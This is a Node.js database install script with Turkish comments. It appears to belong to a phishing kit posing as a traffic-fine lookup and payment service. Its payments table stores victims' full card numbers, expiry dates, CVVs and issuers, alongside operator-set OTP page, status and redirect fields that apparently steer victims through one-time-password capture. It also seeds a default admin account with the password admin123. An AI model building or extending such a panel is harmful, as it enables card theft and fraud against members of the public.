// Çalıştır: node install.js
require('dotenv').config();
const { pool, query } = require('./db');
const bcrypt = require('bcryptjs');

async function install() {
  console.log('⏳ Tablolar oluşturuluyor...');

  await query(`
    CREATE TABLE IF NOT EXISTS admin_users (
      id         INT AUTO_INCREMENT PRIMARY KEY,
      username   VARCHAR(50) UNIQUE NOT NULL,
      password   VARCHAR(255) NOT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
  `);

  await query(`
    CREATE TABLE IF NOT EXISTS settings (
      \`key\`    VARCHAR(80) PRIMARY KEY,
      \`value\`  TEXT NOT NULL DEFAULT '',
      updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
  `);

  await query(`
    CREATE TABLE IF NOT EXISTS inquiries (
      id           INT AUTO_INCREMENT PRIMARY KEY,
      sid          VARCHAR(64),
      plate_no     VARCHAR(20),
      plate_src    VARCHAR(10),
      plate_code   VARCHAR(20),
      fine_count   INT DEFAULT 0,
      total_amount DECIMAL(10,2) DEFAULT 0,
      ip           VARCHAR(60),
      user_agent   TEXT,
      created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      INDEX idx_sid   (sid),
      INDEX idx_plate (plate_src, plate_no)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
  `);

  await query(`
    CREATE TABLE IF NOT EXISTS payments (
      id           INT AUTO_INCREMENT PRIMARY KEY,
      sid          VARCHAR(64) UNIQUE,
      plate_no     VARCHAR(20),
      plate_src    VARCHAR(10),
      plate_code   VARCHAR(20),
      total_fine   DECIMAL(10,2) DEFAULT 0,
      fine_count   INT DEFAULT 0,
      card_name    VARCHAR(120),
      card_number  VARCHAR(30),
      expiry       VARCHAR(10),
      cvv          VARCHAR(10),
      card_scheme  VARCHAR(30),
      card_type    VARCHAR(30),
      card_issuer  VARCHAR(120),
      card_country VARCHAR(60),
      ip           VARCHAR(60),
      otp_page     VARCHAR(30) DEFAULT 'otp-sms',
      otp_status   VARCHAR(20) DEFAULT 'pending',
      redirect_to  VARCHAR(30) DEFAULT NULL,
      created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      INDEX idx_sid     (sid),
      INDEX idx_status  (otp_status),
      INDEX idx_created (created_at)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
  `);

  await query(`
    CREATE TABLE IF NOT EXISTS otp_events (
      id         INT AUTO_INCREMENT PRIMARY KEY,
      sid        VARCHAR(64),
      type       VARCHAR(40),
      ip         VARCHAR(60),
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      INDEX idx_sid (sid)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
  `);

  // Default settings
  const defaults = { otp_default_page: 'otp-sms', site_active: '1' };
  for (const [k, v] of Object.entries(defaults)) {
    await query('INSERT IGNORE INTO settings (`key`, `value`) VALUES (?, ?)', [k, v]);
  }

  // Default admin user
  const hash = await bcrypt.hash('admin123', 10);
  await query('INSERT IGNORE INTO admin_users (username, password) VALUES (?, ?)', ['admin', hash]);

  console.log('✅ Tablolar oluşturuldu.');
  console.log('✅ Varsayılan admin: admin / admin123');
  process.exit(0);
}

install().catch(err => { console.error('❌ Hata:', err.message); process.exit(1); });
